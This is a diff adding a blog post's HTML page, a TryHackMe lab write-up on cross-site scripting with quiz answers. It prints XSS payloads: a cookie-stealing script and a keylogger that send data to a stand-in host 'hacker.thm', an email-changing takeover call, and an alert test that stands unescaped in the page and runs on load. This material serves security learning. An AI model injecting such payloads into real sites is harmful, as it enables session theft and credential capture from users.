@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>TryHackMe - Cross-Site Scripting (XSS)</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe - Cross-Site Scripting (XSS) | 0xskar</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="TryHackMe - Cross-Site Scripting (XSS)" />
+<meta name="author" content="0xskar" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://tryhackme.com/room/xssgi" />
+<meta property="og:description" content="https://tryhackme.com/room/xssgi" />
+<link rel="canonical" href="http://localhost:4000/TryHackMe-XSS" />
+<meta property="og:url" content="http://localhost:4000/TryHackMe-XSS" />
+<meta property="og:site_name" content="0xskar" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-06-12T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe - Cross-Site Scripting (XSS)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0xskar","url":"https://0xskar.github.io"},"dateModified":"2022-06-12T00:00:00-07:00","datePublished":"2022-06-12T00:00:00-07:00","description":"https://tryhackme.com/room/xssgi","headline":"TryHackMe - Cross-Site Scripting (XSS)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/TryHackMe-XSS"},"url":"http://localhost:4000/TryHackMe-XSS"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>0xskar@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>TryHackMe - Cross-Site Scripting (XSS)</h2>
+  <time datetime="2022-06-12T00:00:00-07:00" class="by-line">12 Jun 2022</time>
+  <p><a href="https://tryhackme.com/room/xssgi">https://tryhackme.com/room/xssgi</a></p>
+
+<p>Learn how to detect and exploit XSS vulnerabilities, giving you control of other visitor’s browsers.</p>
+
+<h2 id="task-1-room-brief"><a href="#header-3"></a>Task 1 Room Brief</h2>
+
+<p>Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you’ll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.</p>
+
+<p>Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.</p>
+
+<ul>
+  <li>XSS found in Shopify</li>
+  <li>$7,500 for XSS found in Steam chat</li>
+  <li>$2,500 for XSS in HackerOne</li>
+  <li>XSS found in Infogram</li>
+</ul>
+
+<p><strong>Answer the questions below</strong></p>
+
+<p>What does XSS stand for? Cross-site Scripting</p>
+
+<h2 id="task-2-xss-payloads"><a href="#header-3"></a>Task 2 XSS Payloads</h2>
+
+<p><strong>Proof Of Concept:</strong></p>
+
+<p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;script&gt;alert('XSS');&lt;/script&gt;</code></p>
+
+<p><strong>Session Stealing:</strong></p>
+
+<p>Details of a user’s session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target’s cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker’s control to be logged. Once the hacker has these cookies, they can take over the target’s session and be logged as that user.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</code></p>
+
+<p><strong>Key Logger:</strong></p>
+
+<p>The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker’s control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</code></p>
+
+<p><strong>Business Logic:</strong></p>
+
+<p>This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user’s email address called user.changeEmail(). Your payload could look like this:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</code></p>
+
+<p>Now that the email address for the account has changed, the attacker may perform a reset password attack.</p>
+
+<p>The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.</p>
+
+<p><strong>Answer the questions below</strong></p>
+
+<p>Which document property could contain the user’s session token?</p>
+
+<p>Checking <a href="https://www.w3schools.com/js/js_htmldom_document.asp">https://www.w3schools.com/js/js_htmldom_document.asp</a> we can see the list of document properties. document.cookie is what we’re looking for since this is for session tokens.</p>
+
+<p>Which JavaScript method is often used as a Proof Of Concept?</p>
+
+<p>From our first example “alert”. We can use <script>alert('XSS');</script> to see if we can xss.</p>
+
+<h2><a href="#header-3"></a></h2>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>0xskar</b>
+    </span>
+    
+    <span>© 2022</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
